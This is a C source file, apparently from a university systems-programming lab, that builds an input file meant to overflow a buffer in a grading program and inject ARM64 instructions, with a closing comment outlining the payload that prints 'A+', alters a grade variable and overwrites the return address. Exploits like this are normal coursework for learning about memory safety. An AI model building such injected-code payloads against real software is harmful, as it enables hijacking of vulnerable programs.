/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/


#include <stdio.h>
#include <string.h>
#include "miniassembler.h"
enum {BUFSIZE = 48};

/*--------------------------------------------------------------------*/


/* 
*/

int main(void)
{
   unsigned int i;
   unsigned int uiInstr;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   psFile = fopen("dataAplus", "w");
   psName = "SeanW";

   /* Writes the student's name to the dataA file */
   for (i = 0; i<strlen(psName); i++){
       fprintf(psFile, "%c", psName[i]);
   }
   /* Writes filler to the dataA file
   so instruction starts at multiple of 4 */
   for (i = 0; i<3; i++){
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the instruction bl printf */
   uiInstr = MiniAssembler_bl(0x400600, 0x420064);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   fclose(psFile);


   return 0;
}




/* structure of BSS section (within buffer):

student name

buffer so it's a multiple of 4

mov w0, 'A'
bl putchar
mov w0, '+'
bl putchar
mov w0, '\0'
adr x1, grade
strb w0, [x1]
b 0x40085c (call of printf)
overrun until x30
write address
*/